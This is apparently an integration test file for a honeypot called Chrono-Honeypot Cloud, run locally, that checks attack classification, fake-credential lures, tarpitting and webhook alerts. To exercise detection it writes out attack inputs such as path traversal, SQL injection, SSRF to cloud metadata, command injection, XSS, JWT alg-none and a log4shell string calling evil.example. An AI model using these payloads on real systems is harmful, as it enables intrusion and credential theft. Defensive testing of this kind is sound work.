"""Integration tests for Chrono-Honeypot Cloud.

Runs the engine on 127.0.0.1 only (plus a local mock webhook receiver); no internet access needed.

Usage:  python tests/test_honeypot.py
"""
import base64, http.client, json, os, re, subprocess, sys, tempfile, threading, time
from http.server import BaseHTTPRequestHandler, HTTPServer

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
INDEX = os.path.join(ROOT, "api", "index.py")
LOG = os.path.join(tempfile.gettempdir(), "chrono_honeypot_test.log")
PORT, HOOK = 8766, 8767
env = dict(os.environ, HONEYPOT_SECRET="test-secret-0123456789abcdef-xyz", TARPIT_MAX_SECONDS="0.5", PORT=str(PORT),
           DISCORD_WEBHOOK_URL=f"http://127.0.0.1:{HOOK}/discord", SLACK_WEBHOOK_URL=f"http://127.0.0.1:{HOOK}/slack",
           SIEM_WEBHOOK_URL=f"http://127.0.0.1:{HOOK}/siem", SIEM_AUTH_HEADER="Bearer t0k", SIEM_HMAC_SECRET="sig-secret",
           WEBHOOK_MIN_SEVERITY="medium", SIEM_MIN_SEVERITY="low")

received = []
class Hook(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0)); received.append((self.path, dict(self.headers), json.loads(self.rfile.read(n))))
        self.send_response(204); self.end_headers()
    def log_message(self, *a): pass
threading.Thread(target=HTTPServer(("127.0.0.1", HOOK), Hook).serve_forever, daemon=True).start()

srv = subprocess.Popen([sys.executable, INDEX], env=env, stdout=open(LOG, "w"), stderr=subprocess.STDOUT)
time.sleep(1.0)

def req(method, path, headers=None, body=None):
    c = http.client.HTTPConnection("127.0.0.1", PORT, timeout=15)
    t = time.time(); c.request(method, path, body=body, headers=headers or {}); r = c.getresponse(); data = r.read()
    return r.status, dict(r.getheaders()), data.decode("utf-8", "replace"), round(time.time() - t, 2)

def last_event():
    lines = [l for l in open(LOG) if l.startswith('{"schema"')]
    return json.loads(lines[-1])

ok = True
def check(name, cond, extra=""):
    global ok; ok &= bool(cond); print(("PASS " if cond else "FAIL ") + name, extra)

s, h, b, t = req("GET", "/x?file=../../.env")
check("traversal -> fake .env", s == 200 and "AWS_ACCESS_KEY_ID=AKIA" in b)
token = re.search(r"INTERNAL_API_TOKEN=(\S+)", b).group(1)
s, h, b, t = req("GET", "/api/v1/secure", {"X-API-Key": token})
e = last_event(); check("honey token reuse detected", "honey_token_reuse" in [x["technique"] for x in e["classification"]["evidence"]] and e["classification"]["severity"] == "critical", e["classification"]["severity"])
req("GET", "/api/v1/secure", {"X-API-Key": token[:-6] + "000000"})
check("forged token NOT flagged", "honey_token_reuse" not in [x["technique"] for x in last_event()["classification"]["evidence"]])

s, h, b, t = req("GET", "/item?id=1;SELECT%20pg_sleep(3)--")
check("blind SQLi simulated delay ~3s", 2.9 <= t <= 4.5, f"t={t}")
s, h, b, t = req("GET", "/wp-login.php", {"User-Agent": "sqlmap/1.7.2"})
check("scanner tarpitted (>=0.4s, <2s)", 0.4 <= t < 2.0, f"t={t} skill={last_event()['classification']['skill_level']}")
check("scanner classified", last_event()["classification"]["skill_level"] == "automated_scanner")
BROWSER = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36", "Accept-Language": "en-US", "Accept-Encoding": "gzip"}
s, h, b, t = req("GET", "/api/v1/search?q=1%2527%2520uNiOn/**/SeLeCt%25200x41424344,@@version--", BROWSER)
c = last_event()["classification"]; check("APT-like classified + low delay", c["skill_level"] == "advanced_persistent_threat" and t < 1.0, f"{c['skill_level']} {c['evasion']} t={t}")

req("GET", "/?a=1&id=5&env=prod&sh=1&pwd=x&ls=2;%20cat=3", {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"})
ev = last_event(); check("benign &id=/&pwd= params NOT flagged", ev["classification"]["severity"] == "info" and not ev["classification"]["evidence"], str(ev["classification"]["evidence"]))
s, h, b, t = req("POST", "/wp-login.php", {"Content-Type": "application/x-www-form-urlencoded"}, "log=admin&pwd=hunter2")
check("WP known user message", "is incorrect" in b or s == 302, f"s={s}")
check("login POST not misclassified as RCE", last_event()["classification"]["primary_intent"] == "credential_stuffing", last_event()["classification"]["primary_intent"])
e = last_event(); check("password not logged in clear", "hunter2" not in json.dumps(e) and e["credentials"]["password_length"] == 7)
s, h, b, t = req("POST", "/wp-login.php", {"Content-Type": "application/x-www-form-urlencoded"}, "log=zzz&pwd=a")
check("WP unknown user message", "not registered" in b or s == 302)
codes = [req("POST", "/api/v1/login", {"Content-Type": "application/json"}, json.dumps({"email": f"u{i}@mail.com", "password": f"P{i}!"}))[0] for i in range(60)]
check("api login mix of 200/401 (deterministic)", set(codes) == {200, 401}, str(sorted(set(codes))))
check("credential stuffing technique", "credential_stuffing" in [x["technique"] for x in last_event()["classification"]["evidence"]])
s, h, b, t = req("POST", "/api/v1/users", {"Content-Type": "application/json"}, '{"name":"x","isAdmin":true,"role":"admin"}')
check("mass assignment echoed + flagged", s == 201 and "mass_assignment" in [x["technique"] for x in last_event()["classification"]["evidence"]])
s, h, b, t = req("GET", "/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role")
check("SSRF -> fake creds", "SecretAccessKey" in b and last_event()["classification"]["primary_intent"] == "server_side_request_forgery")
s, h, b, t = req("GET", "/ping?host=127.0.0.1;id"); check("RCE id output", "uid=33(www-data)" in b)
s, h, b, t = req("GET", "/t?name=%7B%7B7*7%7D%7D"); check("SSTI 49", b == "49", b[:40])
s, h, b, t = req("GET", "/", {"User-Agent": "${jndi:ldap://evil.example/a}"}); check("log4shell flagged critical", last_event()["classification"]["severity"] == "critical" and s == 200)
hdr = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
s, h, b, t = req("GET", "/api/v1/users/7", {"Authorization": f"Bearer {hdr}.e30."})
check("JWT alg none flagged", "jwt_alg_none" in [x["technique"] for x in last_event()["classification"]["evidence"]]); check("authorization token redacted", hdr not in json.dumps(last_event()["http"]["headers"]))
check("IDOR 9999 -> 404", req("GET", "/api/v1/users/9999")[0] == 404)
check("HEAD no body", req("HEAD", "/")[2] == "")
check("OPTIONS 204", req("OPTIONS", "/api")[0] == 204)
check("PROPFIND handled", req("PROPFIND", "/")[0] in (200, 404))
check("TRACE handled", req("TRACE", "/")[0] in (200, 404))
check("robots lure", "Disallow: /admin/" in req("GET", "/robots.txt")[2])
check("graphql schema", "__schema" in req("GET", "/graphql?query=%7B__schema%7Btypes%7Bname%7D%7D%7D")[2])
check("actuator env", "spring.datasource.password" in req("GET", "/actuator/env")[2])
check("backup.sql", "INSERT INTO `users`" in req("GET", "/backup.sql")[2])
check("git config", "[remote \"origin\"]" in req("GET", "/.git/config")[2])
s, h, b, t = req("GET", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E"); check("XSS reflected escaped", "<script>" not in b and "&lt;script&gt;" in b)
s, h, b, t = req("GET", "/%3Cimg%20src=x%20onerror=alert(1)%3E"); check("XSS in path escaped", "<img" not in b)
s, h, b, t = req("POST", "/api/v1/echo", {"Content-Type": "application/json", "Content-Length": "5"}, "{bad"); check("malformed JSON ok", s in (200, 404))
big = "A" * 200000; s, h, b, t = req("POST", "/upload", {"Content-Type": "text/plain"}, big); check("oversize body ok", s in (200, 404) and last_event()["http"]["body_bytes"] <= 65536, str(last_event()["http"]["body_bytes"]))
s, h, b, t = req("GET", "/" + "a" * 6000); check("very long path ok", s in (200, 404, 414))
for p in ("/admin", "/phpmyadmin", "/wp-admin", "/xmlrpc.php", "/admin/dashboard"): check(f"route {p}", req("GET", p)[0] in (200, 302, 405), p)
# persona consistency + header sanity
s1, h1, _, _ = req("GET", "/nope"); s2, h2, _, _ = req("GET", "/nope2")
check("persona stable per fingerprint", h1["Server"] == h2["Server"], h1["Server"])
check("no python/BaseHTTP leak", all("Python" not in v and "BaseHTTP" not in v for v in h1.values()))
# --- Vercel rewrite simulation: function is invoked at the DESTINATION with the original path in a query param
s, h, b, t = req("GET", "/api/index?__chrono_path=.env"); check("vercel-style: original path .env recovered", "AWS_ACCESS_KEY_ID=AKIA" in b and last_event()["http"]["path"] == "/.env", last_event()["http"]["path"])
s, h, b, t = req("GET", "/api/index?__chrono_path=wp-login.php&x=1"); check("vercel-style: wp-login recovered", "Log In" in b and last_event()["http"]["path"] == "/wp-login.php")
s, h, b, t = req("GET", "/api/index?__chrono_path=&q=1%27%20UNION%20SELECT%201,2--"); e = last_event(); check("vercel-style: root + original query kept, marker stripped", e["http"]["path"] == "/" and e["http"]["parameters"]["query"] == {"q": "1' UNION SELECT 1,2--"} and e["classification"]["primary_intent"] == "sql_injection", str(e["http"]["parameters"]))
s, h, b, t = req("GET", "/api/index?__chrono_path=api%2Fv1%2Fusers"); check("vercel-style: nested encoded path", "password_hash" in b and last_event()["http"]["path"] == "/api/v1/users")
s, h, b, t = req("GET", "/api/index"); check("unresolved /api/index served as portal, not 404", s == 200 and "Customer Portal" in b)
s, h, b, t = req("GET", "/api/index?__chrono_path=:path*"); check("unsubstituted template served as portal", s == 200 and "Customer Portal" in b)
# --- severity ranking regression (string max() bug): high finding + low finding must stay HIGH
req("GET", "/search?q=1'%20UNION%20SELECT%20username,password%20FROM%20users--", {"User-Agent": "sqlmap/1.7.2"}); c = last_event()["classification"]
check("severity ranked by level not alphabetically (union + scanner UA = high)", c["severity"] == "high", c["severity"])
req("GET", "/x?file=../../.env", {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/120", "Accept-Language": "en", "Accept-Encoding": "gzip"}); c = last_event()["classification"]
check("traversal (high) + sensitive-file probe (medium) stays high+", c["severity"] in ("high", "critical"), c["severity"])
req("GET", "/wp-login.php", {"User-Agent": "Nikto/2.5"}); check("recon-only scanner stays low", last_event()["classification"]["severity"] == "low", last_event()["classification"]["severity"])
time.sleep(0.8)
paths = {p for p, _, _ in received}
check("webhooks hit discord/slack/siem", {"/discord", "/slack", "/siem"} <= paths, str(paths))
d = next(x for x in received if x[0] == "/discord")[2]; check("discord no mentions + embed", d["allowed_mentions"] == {"parse": []} and d["embeds"][0]["fields"])
sm = next(x for x in received if x[0] == "/siem"); check("siem auth+hmac headers", sm[1].get("Authorization") == "Bearer t0k" and sm[1].get("X-Chrono-Signature", "").startswith("sha256="))
check("siem got low-severity events too", any(x[2]["classification"]["severity"] == "low" for x in received if x[0] == "/siem"))
check("chat gets only >=medium", all(x[2]["embeds"][0]["title"].split("]")[0][1:].lower() in ("medium", "high", "critical") for x in received if x[0] == "/discord"))
errs = [l for l in open(LOG) if '"level":"error"' in l]; check("no pipeline errors", not errs, "".join(errs)[:400])

# ---- Vercel rewrite emulation: function receives /api/index?__chrono_path=<orig>&<orig query> ----
s, h, b, t = req("GET", "/api/index?__chrono_path=")
check("rewrite: root -> portal (not 404)", s == 200 and "Customer Portal" in b, f"s={s}")
s, h, b, t = req("GET", "/api/index?__chrono_path=.env")
check("rewrite: /.env recovered -> fake env", s == 200 and "AWS_ACCESS_KEY_ID=AKIA" in b)
e = last_event(); check("rewrite: logged path is original, param stripped", e["http"]["path"] == "/.env" and "__chrono_path" not in json.dumps(e["http"]["parameters"]), e["http"]["path"])
s, h, b, t = req("GET", "/api/index?__chrono_path=wp-login.php")
check("rewrite: wp-login recovered", "Log In" in b)
s, h, b, t = req("GET", "/api/index?__chrono_path=download&file=..%2F..%2F.env")
check("rewrite: original query preserved + traversal", "AWS_ACCESS_KEY_ID" in b and last_event()["http"]["parameters"]["query"] == {"file": "../../.env"}, str(last_event()["http"]["parameters"]))
s, h, b, t = req("GET", "/api/index?__chrono_path=api/v1/users")
check("rewrite: nested path /api/v1/users", s == 200 and '"data"' in b)
s, h, b, t = req("GET", "/api/index?__chrono_path=etc%2Fpasswd")
check("rewrite: encoded slash in param", "root:x:0:0" in b)
s, h, b, t = req("GET", "/api/index?__chrono_path=admin&__chrono_path=.env")
check("rewrite: first param wins, duplicates stripped", "Admin Console" in b and "AWS_ACCESS" not in b)
s, h, b, t = req("GET", "/api/index?__chrono_path=:path*")
check("rewrite: unsubstituted placeholder -> safe portal", s == 200 and "Customer Portal" in b)
s, h, b, t = req("GET", "/api/index")
check("no marker + /api/index -> portal not 404", s == 200 and "Customer Portal" in b)
s, h, b, t = req("GET", "/api/index?__chrono_path=api/index")
check("explicit /api/index via marker -> persona 404", s == 404)
errs2 = [l for l in open(LOG) if '"level":"error"' in l]; check("no pipeline errors (rewrite)", not errs2)

srv.terminate(); print("\nALL OK" if ok else "\nSOME FAILED")
